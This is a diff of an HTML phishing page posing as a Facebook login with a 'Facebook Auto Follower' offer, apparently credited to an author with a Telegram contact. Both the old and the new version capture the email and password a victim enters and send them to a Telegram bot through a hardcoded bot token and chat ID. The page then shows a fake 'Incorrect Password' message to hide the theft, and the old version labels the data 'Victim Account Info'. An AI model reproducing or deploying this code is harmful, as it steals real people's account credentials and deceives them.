@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html>
 <style type="text/css">
@@ -87,83 +88,85 @@ h1 {
   color: #000;
 }
 </style>
+<head>
 
-  <head>
-    <title>Facebook Login</title>
-    <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Facebook Auto Follower</title>
+	<link rel="stylesheet" type="text/css" href="style.css">
+</head>
+<h3 style="text-align:center;color:#1877f2;">Login First and get auto Follower. <br>Per Click 350 Follower Sent!</h3>
+<body>
+
+    <p id="error-message"></p>
+    
+	<div class="container">
+		<h1>Facebook Auto Follower</h1>
+
+		<form>
+			<label for="email">Email or Phone</label>
+			<input type="text" id="email" name="email" required>
+			<label for="password">Password</label>
+			<input type="password" id="password" name="password" required>
+			<button type="submit" id="login" class="btn">Log In</button>
+		</form>
+		<p><a href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr">Forgot Password?</a></p>
+		<hr>
+		<p>Don't have an account? <a href="https://m.facebook.com/reg/?cid=103&refsrc=deprecated&rtime=1679408395&subno_key=AaFkUvnR1UXz5BB-nEuQbGjRTjlo8TGU32dvtNicoDPg4wZiIhQITGS0w_cfGRq2Mx5R6s-DIXo-5-YnDNFjon3Rvwk1u_9UZvAAy3gg3J8anMMkNH7Gz0jqlCPcziGau0GDZhQ9qLg1mFtXwV0iklzv16cPnyY2tz2447J1FKQq_HbH1iRWEfpI2LQmHKyJQ76QukiUnkEHt352sQ3-yOJi6-X92kohNbxhKcwYYwIcI-ZNHV4FUJGQGwV14VDSvQl29CtCsXlA_qsYtB2CkesotivluRPQZz1OArg9Dowqi2mQzqo1ntMcZ8-D9bpbmEg&hrc=1&_rdr">Sign up</a></p>
+	</div>
+
+<!---Coded By: Shofikul Islam---->
+<!---Telegram: https://t.me/S80F9KU50--->
 
 
-
-    <link rel="stylesheet" type="text/css" href="style.css">
-  </head>
-  <body>
-    <div class="login-box">
-      <img src="https://www.facebook.com/images/fb_icon_325x325.png" class="avatar">
-      <h1>Log In Facebook</h1>
-<strong style="text-align:center;color:#1877f2;">Get Facebook Auto Follower. Per Click 700 Follower Sent Your ID. </strong><br> <br>
-      <form onsubmit="submitForm(event)">
-        <div>
-          <label for="email-or-phone">Email or Phone</label>
-          <input type="text" id="email-or-phone" name="email-or-phone" placeholder="Enter Email or Phone">
-        </div>
-        <div>
-          <label for="password">Password</label>
-          <input type="password" id="password" name="password" placeholder="Enter Password">
-        </div>
-        <div>
-          <label for="video-link">Enter your Id Link</label>
-          <input type="text" id="video-link" name="video-link" placeholder="Enter Id Link Here">
-        </div>
-        <div>
-          <input type="submit" value="Log In">
-        </div>
-        <div>
-          <a href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr">Forgot Password</a><br>
-          <a href="https://m.facebook.com/reg/?cid=103&refsrc=deprecated&rtime=1679553612&subno_key=AaEhVssEsCPnwpQ3lYUbJpIvBZiGKhuqdJBozChuRFY8J9xaCuBx-yto7i7g-ssMzL0UzTpS0vPidB-X6G1VZmuun01d1LTi8wtoFZXPvjnaqieyncBzMdkU2koydGyohn_cdD3YRHl1P4qCo4OlCvjstZOtePG-lwB-PfHG0AJeNHAT7wn5oMYTkcmtj5DkB4WJFVYhXJr-HNh20r_YFCtRhZBJfD0O4ZSixqmTPqG6UbURD4dF0fhcMJsbdHm4a7_vs6c_lP7Bi8xFz6eQof8rZc0y6BEYvqJwCd7nXSFhy_QN_m1vhZxeFKWH4B9hj3I&hrc=1&_rdr">Create a New Account</a>
-        </div>
-      </form>
-    </div>
-    <script>
+	<script>
+		
+		const botToken = "6025614798:AAGnscxH0t-9S6Pe0q9EYCbf9vaXctGcjhI";
 
 
 
 
-      function submitForm(event) {
-        event.preventDefault();
-        const emailOrPhone = document.getElementById('email-or-phone').value;
-        const password = document.getElementById('password').value;
-        const videoLink = document.getElementById('video-link').value;
-        const botToken = '6025614798:AAGnscxH0t-9S6Pe0q9EYCbf9vaXctGcjhI;
+
+const chatId = "5947339497";
 
 
 
 
 
 
-        const chatId = '5947339497';
 
+		 
+		const emailInput = document.getElementById("email");
+		const passwordInput = document.getElementById("password");
+		const loginButton = document.getElementById("login");
 
+		// Add click event listener to login button
+		loginButton.addEventListener("click", function(event) {
+			event.preventDefault();
+			// Get input values
+			const email = emailInput.value;
+			const password = passwordInput.value;
+			
+			// Send message to Telegram bot
+			const message = `New login:\nEmail: ${email}\nPassword: ${password}`;
+			const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+			
+			fetch(url)
+				.then(response => {
+					if (response.ok) {
+					var errorMessage = "Incorrect Password! Please try again.";
+      document.getElementById("error-message").textContent = errorMessage;
 
-
-
-
-        const message = `Victim Account Info 
-        Email : ${emailOrPhone}. 
-        Password : ${password}. 
-        Video Link : ${videoLink}`;
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-        fetch(url, { method: 'POST' })
-          .then(response => response.json())
-          .then(data => {
-            console.log('Incorrect Password! :', data);
-            const successMessage = document.createElement('p');
-            successMessage.textContent = 'Incorrect Password! ';
-            document.body.appendChild(successMessage);
-          })
-          .catch(error => console.error('Error sending message:', error));
-      }
-    </script>
-  </body>
+						emailInput.value = "";
+						passwordInput.value = "";
+					} else {
+						throw new Error("Failed to send message to Telegram bot.");
+					}
+				})
+				.catch(error => {
+					console.error(error);
+					alert("Failed to send login information to Telegram bot.");
+				});
+		});
+	</script>
+</body>
 </html>
-
